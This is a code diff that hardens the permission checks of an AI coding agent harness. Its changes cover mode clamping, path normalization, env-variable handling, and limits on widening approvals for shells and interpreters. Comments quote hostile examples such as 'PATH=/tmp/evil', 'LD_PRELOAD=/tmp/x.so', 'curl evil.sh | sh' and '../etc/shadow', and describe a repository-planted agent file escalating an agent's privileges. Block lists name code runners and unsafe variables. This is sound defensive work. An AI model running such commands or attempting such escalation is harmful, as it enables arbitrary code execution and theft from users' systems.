@@ -1,4 +1,4 @@
-import { join } from "node:path"
+import { join, normalize } from "node:path"
 import type { PermissionAction, PermissionRules } from "../types/config.ts"
 import type { PermissionDecision, PermissionRequest } from "../types/tool.ts"
 
@@ -11,6 +11,24 @@ import type { PermissionDecision, PermissionRequest } from "../types/tool.ts"
  *          bash is allowed only for commands that cannot change anything.
  */
 export type Mode = "build" | "auto" | "plan"
+
+/** Modes in increasing order of what they permit without asking. */
+const MODE_RANK: Record<Mode, number> = { plan: 0, build: 1, auto: 2 }
+
+/**
+ * The more restrictive of two postures.
+ *
+ * A named agent may declare its own mode, and declaring a *stricter* one (a
+ * reviewer pinned to plan) is the point of the feature. Declaring a laxer one
+ * must not work: agent files are read from `<cwd>/.haxford/agents`, which
+ * arrives with any repository you clone, and the model picks which agent to
+ * spawn. Without this clamp a checked-in `mode: auto` agent turns a plan-mode
+ * session — read-only, by promise — into unattended writes and shell access.
+ */
+export function clampMode(requested: Mode | undefined, ceiling: Mode): Mode {
+  if (requested === undefined) return ceiling
+  return MODE_RANK[requested] < MODE_RANK[ceiling] ? requested : ceiling
+}
 
 /** Tools that never need approval when no rule says otherwise. */
 const ALLOW_BY_DEFAULT = new Set([
@@ -104,6 +122,25 @@ function globToRegExp(pattern: string, flat: boolean): RegExp | null {
 
 function matches(pattern: string, subject: string, flat: boolean): boolean {
   return globToRegExp(pattern, flat)?.test(subject) ?? false
+}
+
+/** A subject that names a resource on another host, not a path on this one. */
+const URL_SCHEME = /^[A-Za-z][A-Za-z0-9+.-]*:\/\//
+
+/**
+ * Collapse `.` and `..` out of a path subject before it meets a glob.
+ *
+ * Glob matching is textual, so `src/**` happily matches
+ * `src/../../../etc/shadow` — the pattern only ever sees a string starting
+ * `src/`. Every path subject is therefore normalized first, so a rule or a
+ * trust glob covers the directory it names and nothing above it.
+ *
+ * URLs are left alone: `normalize` would turn `https://a/b` into `https:/a/b`
+ * and break every webfetch rule.
+ */
+function normalizePathSubject(subject: string): string {
+  if (subject === "" || URL_SCHEME.test(subject)) return subject
+  return normalize(subject)
 }
 
 /* -------------------------------------------------------------------------- */
@@ -290,6 +327,47 @@ const CONDITIONAL_WRAPPERS = new Set(["command", "builtin", "xargs"])
 /** A leading `NODE_ENV=test` style assignment, which does not change what runs. */
 const ASSIGNMENT = /^[A-Za-z_][A-Za-z0-9_]*=/
 
+/**
+ * Environment variables that DO change what runs, or what the thing that runs
+ * loads once it is running.
+ *
+ * `NODE_ENV=test npm test` is still `npm test`, so assignments are stripped
+ * before rules are matched. But `PATH=/tmp/evil git status` is not `git
+ * status` — it is whatever `/tmp/evil/git` happens to be — and
+ * `LD_PRELOAD=/tmp/x.so ls` runs attacker code inside a command a rule
+ * vouched for. Stripping either would let `Bash(git status *)` or a
+ * `git status` trust prefix stand in for arbitrary execution.
+ *
+ * An assignment named here is left attached to the command, so the subject no
+ * longer matches the narrow rule and the user is asked. Over-matching costs a
+ * prompt; under-matching costs the sandbox.
+ */
+const UNSAFE_ASSIGNMENT_NAMES: ReadonlySet<string> = new Set([
+  "PATH", "IFS", "ENV", "BASH_ENV", "SHELLOPTS", "BASHOPTS", "GLOBIGNORE",
+  "PS4", "CDPATH", "PROMPT_COMMAND", "EDITOR", "VISUAL", "PAGER", "SHELL",
+  // HOME and TMPDIR relocate the config a command reads on startup, and those
+  // configs (`.gitconfig` aliases, `.npmrc` scripts) run commands of their own.
+  "HOME", "TMPDIR",
+])
+
+/** Prefixes of variable families that inject code into a process. */
+const UNSAFE_ASSIGNMENT_PREFIXES: readonly string[] = [
+  "LD_", "DYLD_", "GIT_", "BASH_", "PERL5", "RUBY", "PYTHON",
+]
+
+/** Suffixes that mark a loader path or an interpreter's option string. */
+const UNSAFE_ASSIGNMENT_SUFFIXES: readonly string[] = [
+  "PATH", "_OPTIONS", "_OPTS", "PRELOAD",
+]
+
+/** Whether an assignment changes what runs and so must not be stripped. */
+function unsafeAssignment(token: string): boolean {
+  const name = token.slice(0, token.indexOf("=")).toUpperCase()
+  if (UNSAFE_ASSIGNMENT_NAMES.has(name)) return true
+  if (UNSAFE_ASSIGNMENT_PREFIXES.some((p) => name.startsWith(p))) return true
+  return UNSAFE_ASSIGNMENT_SUFFIXES.some((s) => name.endsWith(s))
+}
+
 /** `30`, `1.5`, `10s` — a wrapper's duration/count argument, not the command. */
 const WRAPPER_ARG = /^\d+(\.\d+)?[smhd]?$/
 
@@ -308,6 +386,9 @@ export function stripWrappers(command: string): string {
     if (head === undefined || tokens.length < 2) break
 
     if (ASSIGNMENT.test(head)) {
+      // An assignment that changes what runs is part of the command, not
+      // noise in front of it: stop here so the rule sees the whole thing.
+      if (unsafeAssignment(head)) break
       tokens = tokens.slice(1)
       continue
     }
@@ -432,7 +513,7 @@ function resolveAction(
   tool: string,
   subject: string,
 ): Resolution {
-  if (tool !== "bash") return resolve(rules, tool, subject)
+  if (tool !== "bash") return resolve(rules, tool, normalizePathSubject(subject))
 
   let worst: Resolution | undefined
   for (const part of splitCommand(subject)) {
@@ -497,7 +578,9 @@ export function hasTrustScope(trust: TrustConfig | undefined): boolean {
  * `src/**` covers `/home/u/proj/src/a.ts` for a session rooted at
  * `/home/u/proj`, without the user having to write absolute patterns.
  */
-function pathCandidates(subject: string, cwd: string | undefined): string[] {
+function pathCandidates(raw: string, cwd: string | undefined): string[] {
+  // Normalized first: `src/**` must not vouch for `src/../../etc/shadow`.
+  const subject = normalizePathSubject(raw)
   const candidates = [subject]
   if (cwd !== undefined && cwd !== "") {
     const prefix = cwd.endsWith("/") ? cwd : `${cwd}/`
@@ -630,6 +713,23 @@ const MAX_SUGGESTED_PATTERNS = 5
 const BARE_WORD = /^[A-Za-z][A-Za-z0-9._-]*$/
 
 /**
+ * Commands whose ARGUMENTS are the program, so widening them to `cmd *` does
+ * not mean "the same command with different arguments" — it means "any code
+ * at all". Approving `bash -c "echo hi"` must not write a `bash *` rule that
+ * silently covers `bash -c "curl evil.sh | sh"` for the rest of time.
+ *
+ * For these the exact command string becomes the pattern instead, so the next
+ * invocation is a different string and gets its own prompt.
+ */
+const CODE_RUNNERS = new Set([
+  "bash", "sh", "zsh", "ksh", "dash", "fish", "csh", "tcsh",
+  "node", "bun", "deno", "python", "python2", "python3", "ruby", "perl",
+  "php", "lua", "osascript", "Rscript",
+  "eval", "exec", "source", "env", "xargs", "sudo", "doas", "ssh", "npx",
+  "bunx", "pnpx", "docker", "podman", "kubectl", "systemd-run", "at", "batch",
+])
+
+/**
  * Derive a rule pattern from one shell command.
  *
  * Keeps the leading command and subcommand — the part that names *what runs* —
@@ -643,13 +743,17 @@ const BARE_WORD = /^[A-Za-z][A-Za-z0-9._-]*$/
  * without also covering scripts the user never approved.
  */
 function commandPattern(command: string): string {
-  const tokens = command.trim().split(/\s+/).filter((token) => token.length > 0)
+  const trimmed = command.trim()
+  const tokens = trimmed.split(/\s+/).filter((token) => token.length > 0)
+  // A command whose arguments ARE the program cannot be widened: `bash *`
+  // would grant every future `bash -c`, which is every command there is.
+  if (tokens[0] !== undefined && CODE_RUNNERS.has(tokens[0])) return trimmed
   const stable: string[] = []
   for (const token of tokens.slice(0, 2)) {
     if (!BARE_WORD.test(token)) break
     stable.push(token)
   }
-  if (stable.length === 0) return command.trim()
+  if (stable.length === 0) return trimmed
   return `${stable.join(" ")} *`
 }
 
@@ -747,6 +851,51 @@ export function createAskHandler(
   opts: AskHandlerOptions,
 ): (req: PermissionRequest) => Promise<PermissionDecision> {
   const remembered = new Set<string>()
+  // Patterns granted by an "always" answer that no rule covered. They are
+  // held as rules rather than as a bare tool name so a later request is
+  // matched the same way a configured rule would match it — see
+  // `rememberAlways` for why the tool name alone will not do.
+  const granted: PermissionRules = {}
+
+  /**
+   * Record an "always" answer.
+   *
+   * When a rule matched, the memory key is tool+pattern: the user approved
+   * the rule they were shown, and anything else it covers is what they
+   * agreed to. When NO rule matched, `pattern` is "" for every subject
+   * alike — so keying on it would remember the *tool*, and the next
+   * uncovered command of that tool would be auto-approved without a prompt.
+   * The concrete patterns the dialog named are recorded instead.
+   */
+  const rememberAlways = (
+    tool: string,
+    pattern: string,
+    patterns: string[],
+  ): void => {
+    if (pattern !== "") {
+      remembered.add(memoryKey(tool, pattern))
+      return
+    }
+    const existing = granted[tool]
+    const rules: Record<string, PermissionAction> =
+      typeof existing === "string" ? { "*": existing } : { ...(existing ?? {}) }
+    for (const p of patterns) rules[p] = "allow"
+    granted[tool] = rules
+  }
+
+  /**
+   * Whether a previous "always" already covers this request.
+   *
+   * The granted patterns are resolved with the very machinery configured
+   * rules use, so a chain has to be granted in every part and a wrapper or
+   * an env assignment cannot smuggle a different command past a grant.
+   * Consulted only where the prompt would otherwise go up, so a `deny` rule
+   * and plan mode both still decide first.
+   */
+  const alreadyGranted = (tool: string, subject: string): boolean => {
+    if (granted[tool] === undefined) return false
+    return resolveAction(granted, tool, subject).action === "allow"
+  }
 
   return async (request: PermissionRequest): Promise<PermissionDecision> => {
     const tool = request.tool
@@ -796,8 +945,11 @@ export function createAskHandler(
       return "allow"
     }
 
-    // A previous "always" for this same tool+pattern stands in for the prompt.
+    // A previous "always" stands in for the prompt: either for this same
+    // tool+pattern, or — when no rule matched — for a pattern the user was
+    // shown and granted earlier in the session.
     if (remembered.has(memoryKey(tool, pattern))) return "always"
+    if (alreadyGranted(tool, subject)) return "always"
 
     let decision: PermissionDecision
     try {
@@ -808,7 +960,7 @@ export function createAskHandler(
     }
 
     if (decision === "always") {
-      remembered.add(memoryKey(tool, pattern))
+      rememberAlways(tool, pattern, suggestPatterns(request))
       if (opts.cwd !== undefined) {
         // Best-effort: the decision stands for this session either way, so a
         // write failure must not turn an approval into a denial.
